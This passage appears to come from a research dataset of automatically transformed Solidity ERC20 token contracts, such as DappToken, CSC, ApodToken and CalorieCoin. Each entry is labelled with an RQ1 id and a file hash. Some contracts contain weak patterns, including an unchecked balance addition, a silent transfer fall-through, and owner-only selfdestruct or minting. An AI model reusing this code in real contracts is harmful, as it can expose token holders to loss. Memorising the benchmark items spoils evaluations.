        uint256 ERC20Token_safeSub_TMP_142_1_0;
        {
            {
                if (!(supply >= _amount)) {
                    revert();
                }
                ERC20Token_safeSub_TMP_142_1_0 = supply - _amount;
            }
        }
        supply = ERC20Token_safeSub_TMP_142_1_0;
        emit Burn(msg.sender, _amount);
        emit Transfer(msg.sender, address(0x0), _amount);
    }

    function salvageTokensFromContract(address _tokenAddress, address _to, uint _amount) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        ERC20TokenInterface(_tokenAddress).transfer(_to, _amount);
    }

    function killContract() public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        selfdestruct(owner);
    }
}

contract RoxToken is ERC20Token {
    event AutoGenerated_mapping_RoxToken(string mapping_origin, string mapping_cache);

    constructor() public {
        name = "Robotina token";
        symbol = "ROX";
        decimals = 18;
        mintingContractAddress = 0x9532014DAdb2C980e43fE4665C86c2c0B1b4603D;
        {
            lockedUntilBlock = 0;
            ContractLocked(0, "Lock before crowdsale starts");
        }
    }
}

```

## RQ1_81a85f242b60

文件 `units/program.sol`；SHA256 `c282080eb99dc8faf5eb31fb86c6c419969a81c71b2ab7d527da52769810aeb8`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.12;

contract IMigrationContract {
    event AutoGenerated_mapping_IMigrationContract(string mapping_origin, string mapping_cache);

    function migrate(address addr, uint256 dappt) returns (bool success);
}

contract SafeMath {
    event AutoGenerated_mapping_SafeMath(string mapping_origin, string mapping_cache);

    function safeAdd(uint256 x, uint256 y) internal returns (uint256) {
        uint256 z = x + y;
        if (!((z >= x) && (z >= y))) {
            revert();
        }
        return z;
    }

    function safeSubtract(uint256 x, uint256 y) internal returns (uint256) {
        if (!(x >= y)) {
            revert();
        }
        uint256 z = x - y;
        return z;
    }

    function safeMult(uint256 x, uint256 y) internal returns (uint256) {
        uint256 z = x * y;
        if (!((x == 0) || (z / x == y))) {
            revert();
        }
        return z;
    }
}

contract Token {
    event AutoGenerated_mapping_Token(string mapping_origin, string mapping_cache);
    uint256 public totalSupply;

    function balanceOf(address _owner) constant returns (uint256 balance);

    function transfer(address _to, uint256 _value) returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);

    function approve(address _spender, uint256 _value) returns (bool success);

    function allowance(address _owner, address _spender) constant returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract StandardToken is Token {
    event AutoGenerated_mapping_StandardToken(string mapping_origin, string mapping_cache);

    function transfer(address _to, uint256 _value) returns (bool success) {
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else {
            return false;
        }
    }

    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else {
            return false;
        }
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
}

contract DappToken is StandardToken, SafeMath {
    event AutoGenerated_mapping_DappToken(string mapping_origin, string mapping_cache);
    string public constant name = "Dapp Token";
    string public constant symbol = "DAPPT";
    uint256 public constant decimals = 18;
    string public version = "1.0";
    address public ethFundDeposit;
    address public newContractAddr;
    bool public isFunding;
    uint256 public fundingStartBlock;
    uint256 public fundingStopBlock;
    uint256 public currentSupply;
    uint256 public tokenRaised = 0;
    uint256 public tokenMigrated = 0;
    uint256 public tokenExchangeRate = 25000;
    event AllocateToken(address indexed _to, uint256 _value);
    event IssueToken(address indexed _to, uint256 _value);
    event IncreaseSupply(uint256 _value);
    event DecreaseSupply(uint256 _value);
    event Migrate(address indexed _to, uint256 _value);

    function formatDecimals(uint256 _value) internal returns (uint256) {
        return _value * 10 ** decimals;
    }

    function DappToken(address _ethFundDeposit, uint256 _currentSupply) {
        ethFundDeposit = _ethFundDeposit;
        isFunding = false;
        fundingStartBlock = 0;
        fundingStopBlock = 0;
        uint256 DappToken_formatDecimals_TMP_58_0_0;
        {
            {
                DappToken_formatDecimals_TMP_58_0_0 = _currentSupply * 10 ** decimals;
            }
        }
        currentSupply = DappToken_formatDecimals_TMP_58_0_0;
        uint256 DappToken_formatDecimals_TMP_59_1_0;
        {
            {
                DappToken_formatDecimals_TMP_59_1_0 = 5000000000 * 10 ** decimals;
            }
        }
        totalSupply = DappToken_formatDecimals_TMP_59_1_0;
        balances[msg.sender] = totalSupply;
        if (currentSupply > totalSupply) {
            throw;
        }
    }

    modifier isOwner() {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        _;
    }

    function setTokenExchangeRate(uint256 _tokenExchangeRate) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (_tokenExchangeRate == 0) {
            throw;
        }
        if (_tokenExchangeRate == tokenExchangeRate) {
            throw;
        }
        tokenExchangeRate = _tokenExchangeRate;
    }

    function increaseSupply(uint256 _value) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        uint256 DappToken_formatDecimals_TMP_70_0_0;
        {
            {
                DappToken_formatDecimals_TMP_70_0_0 = _value * 10 ** decimals;
            }
        }
        uint256 value = DappToken_formatDecimals_TMP_70_0_0;
        if (value + currentSupply > totalSupply) {
            throw;
        }
        uint256 DappToken_safeAdd_TMP_73_0_0;
        {
            {
                uint256 DappToken_safeAdd_2_z_0_0 = currentSupply + value;
                if (!((DappToken_safeAdd_2_z_0_0 >= currentSupply) && (DappToken_safeAdd_2_z_0_0 >= value))) {
                    revert();
                }
                DappToken_safeAdd_TMP_73_0_0 = DappToken_safeAdd_2_z_0_0;
            }
        }
        currentSupply = DappToken_safeAdd_TMP_73_0_0;
        IncreaseSupply(value);
    }

    function decreaseSupply(uint256 _value) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        uint256 DappToken_formatDecimals_TMP_79_0_0;
        {
            {
                DappToken_formatDecimals_TMP_79_0_0 = _value * 10 ** decimals;
            }
        }
        uint256 value = DappToken_formatDecimals_TMP_79_0_0;
        if (value + tokenRaised > currentSupply) {
            throw;
        }
        uint256 DappToken_safeSubtract_TMP_82_0_0;
        {
            {
                if (!(currentSupply >= value)) {
                    revert();
                }
                uint256 DappToken_safeSubtract_2_z_0_0 = currentSupply - value;
                DappToken_safeSubtract_TMP_82_0_0 = DappToken_safeSubtract_2_z_0_0;
            }
        }
        currentSupply = DappToken_safeSubtract_TMP_82_0_0;
        DecreaseSupply(value);
    }

    function startFunding(uint256 _fundingStartBlock, uint256 _fundingStopBlock) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (isFunding) {
            throw;
        }
        if (_fundingStartBlock >= _fundingStopBlock) {
            throw;
        }
        if (block.number >= _fundingStartBlock) {
            throw;
        }
        fundingStartBlock = _fundingStartBlock;
        fundingStopBlock = _fundingStopBlock;
        isFunding = true;
    }

    function stopFunding() external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (!isFunding) {
            throw;
        }
        isFunding = false;
    }

    function setMigrateContract(address _newContractAddr) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (_newContractAddr == newContractAddr) {
            throw;
        }
        newContractAddr = _newContractAddr;
    }

    function changeOwner(address _newFundDeposit) external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (_newFundDeposit == address(0x0)) {
            throw;
        }
        ethFundDeposit = _newFundDeposit;
    }

    function transferETH() external isOwner {
        if (!(msg.sender == ethFundDeposit)) {
            revert();
        }
        if (this.balance == 0) {
            throw;
        }
        if (!ethFundDeposit.send(this.balance)) {
            throw;
        }
    }

    function() payable {
        if (msg.value == 0) {
            throw;
        }
        if (block.number < fundingStartBlock) {
            throw;
        }
        if (block.number > fundingStopBlock) {
            throw;
        }
        uint256 DappToken_safeMult_TMP_117_0_0;
        {
            {
                uint256 DappToken_safeMult_2_z_0_0 = msg.value * tokenExchangeRate;
                if (!((msg.value == 0) || (DappToken_safeMult_2_z_0_0 / msg.value == tokenExchangeRate))) {
                    revert();
                }
                DappToken_safeMult_TMP_117_0_0 = DappToken_safeMult_2_z_0_0;
            }
        }
        uint256 tokens = DappToken_safeMult_TMP_117_0_0;
        if (tokens + tokenRaised > currentSupply) {
            throw;
        }
        uint256 DappToken_safeAdd_TMP_120_0_0;
        {
            {
                uint256 DappToken_safeAdd_2_z_0_0 = tokenRaised + tokens;
                if (!((DappToken_safeAdd_2_z_0_0 >= tokenRaised) && (DappToken_safeAdd_2_z_0_0 >= tokens))) {
                    revert();
                }
                DappToken_safeAdd_TMP_120_0_0 = DappToken_safeAdd_2_z_0_0;
            }
        }
        tokenRaised = DappToken_safeAdd_TMP_120_0_0;
        balances[msg.sender] += tokens;
        IssueToken(msg.sender, tokens);
    }
}

```

## RQ1_5b3469baa447

文件 `units/program.sol`；SHA256 `2abb5d442016bf4d1434d11644e092bdf65cae810049664a761c4862adc92c21`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.23;

contract CSC {
    event AutoGenerated_mapping_CSC(string mapping_origin, string mapping_cache);
    mapping(address => uint256) internal balances;
    mapping(address => uint256[2]) internal lockedBalances;
    string public name;
    uint8 public decimals;
    string public symbol;
    uint256 public totalSupply;
    address public owner;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    constructor(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol, address _owner, address[] _lockedAddress, uint256[] _lockedBalances, uint256[] _lockedTimes) public {
        balances[_owner] = _initialAmount;
        totalSupply = _initialAmount;
        name = _tokenName;
        decimals = _decimalUnits;
        symbol = _tokenSymbol;
        owner = _owner;
        for (uint i = 0; i < _lockedAddress.length; i++) {
            lockedBalances[_lockedAddress[i]][0] = _lockedBalances[i];
            lockedBalances[_lockedAddress[i]][1] = _lockedTimes[i];
        }
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        if (_to != address(0x0)) {
            if (lockedBalances[msg.sender][1] >= now) {
                if (!((balances[msg.sender] > lockedBalances[msg.sender][0]) && (balances[msg.sender] - lockedBalances[msg.sender][0] >= _value))) {
                    revert();
                }
            } else {
                if (!(balances[msg.sender] >= _value)) {
                    revert();
                }
            }
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
            return true;
        }
    }

    function burnFrom(address _who, uint256 _value) public returns (bool) {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(balances[_who] >= _value)) {
            revert();
        }
        totalSupply -= _value;
        balances[_who] -= _value;
        lockedBalances[_who][0] = 0;
        lockedBalances[_who][1] = 0;
        return true;
    }

    function makeCoin(uint256 _value) public returns (bool) {
        if (!(msg.sender == owner)) {
            revert();
        }
        totalSupply += _value;
        balances[owner] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function withdraw() public {
        if (!(msg.sender == owner)) {
            revert();
        }
        msg.sender.transfer(address(this).balance);
    }

    function withdrawTo(address _to) public {
        if (!(msg.sender == owner)) {
            revert();
        }
        address(_to).transfer(address(this).balance);
    }
}

```

## RQ1_f922252cd038

文件 `units/program.sol`；SHA256 `e5b33f5c85289ebf30e1a05b2bfdef9dd9279051829517572caa0205805bce47`；位置按UTF-8字节。

```solidity
pragma solidity 0.4.26;

contract SafeMath {
    event AutoGenerated_mapping_SafeMath(string mapping_origin, string mapping_cache);
    uint256 public constant MAX_UINT256 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;

    function safeAdd(uint256 x, uint256 y) internal constant returns (uint256 z) {
        if (!(x <= MAX_UINT256 - y)) {
            revert();
        }
        return x + y;
    }

    function safeSub(uint256 x, uint256 y) internal constant returns (uint256 z) {
        if (!(x >= y)) {
            revert();
        }
        return x - y;
    }

    function safeMul(uint256 x, uint256 y) internal constant returns (uint256 z) {
        if (y == 0) {
            return 0;
        }
        if (!(x <= (MAX_UINT256 / y))) {
            revert();
        }
        return x * y;
    }
}

contract Owned {
    event AutoGenerated_mapping_Owned(string mapping_origin, string mapping_cache);
    address public owner;
    address public originNewOwner;

    function Owned() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (!(msg.sender == owner)) {
            revert();
        }
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        if (!(_newOwner != owner)) {
            revert();
        }
        originNewOwner = _newOwner;
    }

    function acceptOwnership() public {
        if (!(msg.sender == originNewOwner)) {
            revert();
        }
        OwnerUpdate(owner, originNewOwner);
        owner = originNewOwner;
        originNewOwner = address(0x0);
    }

    event OwnerUpdate(address _prevOwner, address _newOwner);
}

contract Lockable is Owned {
    event AutoGenerated_mapping_Lockable(string mapping_origin, string mapping_cache);
    uint256 public lockedUntilBlock;
    event ContractLocked(uint256 _untilBlock, string _reason);
    modifier lockAffected() {
        if (!(block.number > lockedUntilBlock)) {
            revert();
        }
        _;
    }

    function lockFromSelf(uint256 _untilBlock, string _reason) internal {
        lockedUntilBlock = _untilBlock;
        ContractLocked(_untilBlock, _reason);
    }

    function lockUntil(uint256 _untilBlock, string _reason) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        lockedUntilBlock = _untilBlock;
        ContractLocked(_untilBlock, _reason);
    }
}

contract ERC20TokenInterface {
    event AutoGenerated_mapping_ERC20TokenInterface(string mapping_origin, string mapping_cache);

    function totalSupply() public constant returns (uint256 _totalSupply);

    function balanceOf(address _owner) public constant returns (uint256 balance);

    function transfer(address _to, uint256 _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function approve(address _spender, uint256 _value) public returns (bool success);

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract ERC20PrivateInterface {
    event AutoGenerated_mapping_ERC20PrivateInterface(string mapping_origin, string mapping_cache);
    uint256 supply;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowances;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract tokenRecipientInterface {
    event AutoGenerated_mapping_tokenRecipientInterface(string mapping_origin, string mapping_cache);

    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData);
}

contract OwnedInterface {
    event AutoGenerated_mapping_OwnedInterface(string mapping_origin, string mapping_cache);
    address public owner;
    address public originNewOwner;
    modifier onlyOwner() {
        _;
    }
}

contract ERC20Token is ERC20TokenInterface, SafeMath, Owned, Lockable {
    event AutoGenerated_mapping_ERC20Token(string mapping_origin, string mapping_cache);
    string public name;
    string public symbol;
    uint8 public decimals;
    address public mintingContract;
    uint256 supply = 0;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowances;
    event Mint(address indexed _to, uint256 _value);
    event Burn(address indexed _from, uint _value);

    function totalSupply() public constant returns (uint256) {
        return supply;
    }

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public lockAffected returns (bool success) {
        if (!(block.number > lockedUntilBlock)) {
            revert();
        }
        if (!(_to != address(0x0) && _to != address(this))) {
            revert();
        }
        uint256 ERC20Token_balanceOf_TMP_97_0_0;
        {
            {
                ERC20Token_balanceOf_TMP_97_0_0 = balances[msg.sender];
            }
        }
        uint256 ERC20Token_safeSub_TMP_98_0_0;
        {
            uint256 TMP_97_0_0 = ERC20Token_balanceOf_TMP_97_0_0;
            {
                if (!(TMP_97_0_0 >= _value)) {
                    revert();
                }
                ERC20Token_safeSub_TMP_98_0_0 = TMP_97_0_0 - _value;
            }
        }
        balances[msg.sender] = ERC20Token_safeSub_TMP_98_0_0;
        uint256 ERC20Token_balanceOf_TMP_99_1_0;
        {
            {
                ERC20Token_balanceOf_TMP_99_1_0 = balances[_to];
            }
        }
        uint256 ERC20Token_safeAdd_TMP_100_0_0;
        {
            uint256 TMP_99_0_0 = ERC20Token_balanceOf_TMP_99_1_0;
            {
                if (!(TMP_99_0_0 <= MAX_UINT256 - _value)) {
                    revert();
                }
                ERC20Token_safeAdd_TMP_100_0_0 = TMP_99_0_0 + _value;
            }
        }
        balances[_to] = ERC20Token_safeAdd_TMP_100_0_0;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public lockAffected returns (bool success) {
        if (!(block.number > lockedUntilBlock)) {
            revert();
        }
        allowances[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public lockAffected returns (bool success) {
        if (!(block.number > lockedUntilBlock)) {
            revert();
        }
        tokenRecipientInterface spender = tokenRecipientInterface(_spender);
        bool ERC20Token_approve_TMP_112_0_0;
        {
            {
                if (!(block.number > lockedUntilBlock)) {
                    revert();
                }
                allowances[msg.sender][_spender] = _value;
                emit Approval(msg.sender, _spender, _value);
                ERC20Token_approve_TMP_112_0_0 = true;
            }
        }

        spender.receiveApproval(msg.sender, _value, this, _extraData);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public lockAffected returns (bool success) {
        if (!(block.number > lockedUntilBlock)) {
            revert();
        }
        if (!(_to != address(0x0) && _to != address(this))) {
            revert();
        }
        uint256 ERC20Token_balanceOf_TMP_125_0_0;
        {
            {
                ERC20Token_balanceOf_TMP_125_0_0 = balances[_from];
            }
        }
        uint256 ERC20Token_safeSub_TMP_126_0_0;
        {
            uint256 TMP_125_0_0 = ERC20Token_balanceOf_TMP_125_0_0;
            {
                if (!(TMP_125_0_0 >= _value)) {
                    revert();
                }
                ERC20Token_safeSub_TMP_126_0_0 = TMP_125_0_0 - _value;
            }
        }
        balances[_from] = ERC20Token_safeSub_TMP_126_0_0;
        uint256 ERC20Token_balanceOf_TMP_127_1_0;
        {
            {
                ERC20Token_balanceOf_TMP_127_1_0 = balances[_to];
            }
        }
        uint256 ERC20Token_safeAdd_TMP_128_0_0;
        {
            uint256 TMP_127_0_0 = ERC20Token_balanceOf_TMP_127_1_0;
            {
                if (!(TMP_127_0_0 <= MAX_UINT256 - _value)) {
                    revert();
                }
                ERC20Token_safeAdd_TMP_128_0_0 = TMP_127_0_0 + _value;
            }
        }
        balances[_to] = ERC20Token_safeAdd_TMP_128_0_0;
        uint256 ERC20Token_safeSub_TMP_129_1_0;
        {
            uint256 REF_11_1_0 = allowances[_from][msg.sender];
            {
                if (!(REF_11_1_0 >= _value)) {
                    revert();
                }
                ERC20Token_safeSub_TMP_129_1_0 = REF_11_1_0 - _value;
            }
        }
        allowances[_from][msg.sender] = ERC20Token_safeSub_TMP_129_1_0;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowances[_owner][_spender];
    }

    function mint(address _to, uint256 _amount) public {
        if (!(msg.sender == mintingContract)) {
            revert();
        }
        uint256 ERC20Token_safeAdd_TMP_135_0_0;
        {
            {
                if (!(supply <= MAX_UINT256 - _amount)) {
                    revert();
                }
                ERC20Token_safeAdd_TMP_135_0_0 = supply + _amount;
            }
        }
        supply = ERC20Token_safeAdd_TMP_135_0_0;
        uint256 ERC20Token_safeAdd_TMP_136_1_0;
        {
            uint256 REF_15_1_0 = balances[_to];
            {
                if (!(REF_15_1_0 <= MAX_UINT256 - _amount)) {
                    revert();
                }
                ERC20Token_safeAdd_TMP_136_1_0 = REF_15_1_0 + _amount;
            }
        }
        balances[_to] = ERC20Token_safeAdd_TMP_136_1_0;
        emit Mint(_to, _amount);
        emit Transfer(address(0x0), _to, _amount);
    }

    function burn(uint _amount) public {
        uint256 ERC20Token_balanceOf_TMP_140_0_0;
        {
            {
                ERC20Token_balanceOf_TMP_140_0_0 = balances[msg.sender];
            }
        }
        uint256 ERC20Token_safeSub_TMP_141_0_0;
        {
            uint256 TMP_140_0_0 = ERC20Token_balanceOf_TMP_140_0_0;
            {
                if (!(TMP_140_0_0 >= _amount)) {
                    revert();
                }
                ERC20Token_safeSub_TMP_141_0_0 = TMP_140_0_0 - _amount;
            }
        }
        balances[msg.sender] = ERC20Token_safeSub_TMP_141_0_0;
        uint256 ERC20Token_safeSub_TMP_142_1_0;
        {
            {
                if (!(supply >= _amount)) {
                    revert();
                }
                ERC20Token_safeSub_TMP_142_1_0 = supply - _amount;
            }
        }
        supply = ERC20Token_safeSub_TMP_142_1_0;
        emit Burn(msg.sender, _amount);
        emit Transfer(msg.sender, address(0x0), _amount);
    }

    function salvageTokensFromContract(address _tokenAddress, address _to, uint _amount) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        ERC20TokenInterface(_tokenAddress).transfer(_to, _amount);
    }

    function killContract() public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        selfdestruct(owner);
    }
}

contract ApodTokenContract is ERC20Token {
    event AutoGenerated_mapping_ApodTokenContract(string mapping_origin, string mapping_cache);

    function ApodTokenContract() public {
        name = "Airpod token";
        symbol = "APOD";
        decimals = 18;
        mintingContract = 0xE7c79DEB6A9b74F691D5F882B7C588BbA5db1A20;
        {
            lockedUntilBlock = 0;
            ContractLocked(0, "Lock before crowdsale starts");
        }
    }
}

```

## RQ1_0c8823eed851

文件 `units/program.sol`；SHA256 `14a5a4a6b50b88f80828145c246bde861fc10704afcb291b13273a87021cce0a`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.17;

contract owned {
    event AutoGenerated_mapping_owned(string mapping_origin, string mapping_cache);
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (!(msg.sender == owner)) {
            revert();
        }
        _;
    }

    function transferOwnership(address originNewOwner) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        owner = originNewOwner;
    }
}

contract ERC223ReceivingContract {
    event AutoGenerated_mapping_ERC223ReceivingContract(string mapping_origin, string mapping_cache);

    function tokenFallback(address _from, uint256 _value, bytes _data) public;
}

contract Token {
    event AutoGenerated_mapping_Token(string mapping_origin, string mapping_cache);
    uint256 public totalSupply;

    function balanceOf(address _owner) public constant returns (uint256 balance);

    function transfer(address _to, uint256 _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function approve(address _spender, uint256 _value) public returns (bool success);

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);

    function transfer(address _to, uint256 _value, bytes _data) public returns (bool success);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract StandardToken is Token {
    event AutoGenerated_mapping_StandardToken(string mapping_origin, string mapping_cache);
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    function transfer(address _to, uint256 _value) public returns (bool) {
        if (!(_to != address(0x0))) {
            revert();
        }
        if (!(_to != address(this))) {
            revert();
        }
        if (!(balances[msg.sender] >= _value)) {
            revert();
        }
        if (!(balances[_to] + _value >= balances[_to])) {
            revert();
        }
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }

    function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {
        bool StandardToken_transfer_TMP_23_0_0;
        {
            {
                if (!(_to != address(0x0))) {
                    revert();
                }
                if (!(_to != address(this))) {
                    revert();
                }
                if (!(balances[msg.sender] >= _value)) {
                    revert();
                }
                if (!(balances[_to] + _value >= balances[_to])) {
                    revert();
                }
                balances[msg.sender] -= _value;
                balances[_to] += _value;
                Transfer(msg.sender, _to, _value);
                StandardToken_transfer_TMP_23_0_0 = true;
            }
        }
        if (!(StandardToken_transfer_TMP_23_0_0)) {
            revert();
        }
        uint codeLength;
        assembly {
            codeLength := extcodesize(_to)
        }
        if (codeLength > 0) {
            ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
            receiver.tokenFallback(msg.sender, _value, _data);
        }
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        if (!(_from != address(0x0))) {
            revert();
        }
        if (!(_to != address(0x0))) {
            revert();
        }
        if (!(_to != address(this))) {
            revert();
        }
        if (!(balances[_from] >= _value)) {
            revert();
        }
        if (!(allowed[_from][msg.sender] >= _value)) {
            revert();
        }
        if (!(balances[_to] + _value >= balances[_to])) {
            revert();
        }
        balances[_to] += _value;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        if (!(_spender != address(0x0))) {
            revert();
        }
        if (!(_value == 0 || allowed[msg.sender][_spender] == 0)) {
            revert();
        }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public constant returns (uint256) {
        return allowed[_owner][_spender];
    }

    function balanceOf(address _owner) public constant returns (uint256) {
        return balances[_owner];
    }
}

contract CalorieCoin is owned, StandardToken {
    event AutoGenerated_mapping_CalorieCoin(string mapping_origin, string mapping_cache);
    string public constant name = "CalorieCoin";
    string public constant symbol = "CAL";
    uint8 public constant decimals = 18;
    uint constant multiplier = 1000000000000000000;
    mapping(address => bool) public frozenAccount;
    event FrozenFunds(address target, bool frozen);
    event Deployed(uint indexed _total_supply);
    event Burnt(address indexed _receiver, uint indexed _num, uint indexed _total_supply);

    function CalorieCoin(address wallet_address, uint initial_supply) public {
        if (!(wallet_address != address(0x0))) {
            revert();
        }
        totalSupply = initial_supply;
        balances[wallet_address] = initial_supply;
        Transfer(address(0x0), wallet_address, balances[wallet_address]);
        Deployed(totalSupply);
        if (!(totalSupply == balances[wallet_address])) {
            revert();
        }
    }

    function burn(uint num) public {
        if (!(num > 0)) {
            revert();
        }
        if (!(balances[msg.sender] >= num)) {
            revert();
        }
        if (!(totalSupply >= num)) {
            revert();
        }
        uint pre_balance = balances[msg.sender];
        balances[msg.sender] -= num;
        totalSupply -= num;
        Burnt(msg.sender, num, totalSupply);
        Transfer(msg.sender, address(0x0), num);
        if (!(balances[msg.sender] == pre_balance - num)) {
            revert();
        }
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        if (!(_to != address(0x0))) {
            revert();
        }
        if (!(_to != address(this))) {
            revert();
        }
        if (!(!frozenAccount[_to])) {
            revert();
        }
        if (!(balances[msg.sender] >= _value)) {
            revert();
        }
        if (!(balances[_to] + _value >= balances[_to])) {
            revert();
        }
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }


    function freezeAccount(address target, bool freeze) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        frozenAccount[target] = freeze;
        FrozenFunds(target, freeze);
    }
}

```

## RQ1_b472a9a0647e

文件 `units/program.sol`；SHA256 `b4e67905c2f3eb31dc1c609d20e3485f8b67a55d99086a62cdad0e44e3bdda65`；位置按UTF-8字节。

```solidity
pragma solidity ^0.5.0;

library SafeMath {
    event AutoGenerated_mapping_SafeMath(string mapping_origin, string mapping_cache);

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        if (!(c / a == b)) {
            revert();
        }
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        if (!(b > 0)) {
            revert();
        }
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        if (!(b <= a)) {
            revert();
        }
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        if (!(c >= a)) {
            revert();
        }
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        if (!(b != 0)) {
            revert();
        }
        return a % b;
    }
}

contract ERC20 {
    event AutoGenerated_mapping_ERC20(string mapping_origin, string mapping_cache);

    function totalSupply() public view returns (uint256);

    function balanceOf(address who) public view returns (uint256);

    function transfer(address to, uint256 value) public returns (bool);

    function transferFrom(address from, address to, uint256 value) public returns (bool);

    function approve(address spender, uint256 value) public returns (bool);

    function allowance(address owner, address spender) public view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract _Base20 is ERC20 {
    event AutoGenerated_mapping__Base20(string mapping_origin, string mapping_cache);
    using SafeMath for uint256;
    using SafeMath for uint256;
    mapping(address => mapping(address => uint256)) internal allowed;
    mapping(address => uint256) internal accounts;
    address internal admin;
    address payable internal founder;
    uint256 internal __totalSupply;

    constructor(uint256 _totalSupply, address payable _founder, address _admin) public {
        __totalSupply = _totalSupply;
        admin = _admin;
        founder = _founder;
        accounts[founder] = __totalSupply;
        emit Transfer(address(0x0), founder, accounts[founder]);
    }

    modifier onlyAdmin() {
        if (!(admin == msg.sender)) {
            revert();
        }
        _;
    }
    modifier onlyFounder() {
        if (!(founder == msg.sender)) {
            revert();
        }
        _;
    }

    function changeFounder(address payable who) public onlyFounder {
        if (!(founder == msg.sender)) {
            revert();
        }
        founder = who;
    }

    function getFounder() public view onlyFounder returns (address) {
        if (!(founder == msg.sender)) {
            revert();
        }
        return founder;
    }

    function changeAdmin(address who) public {
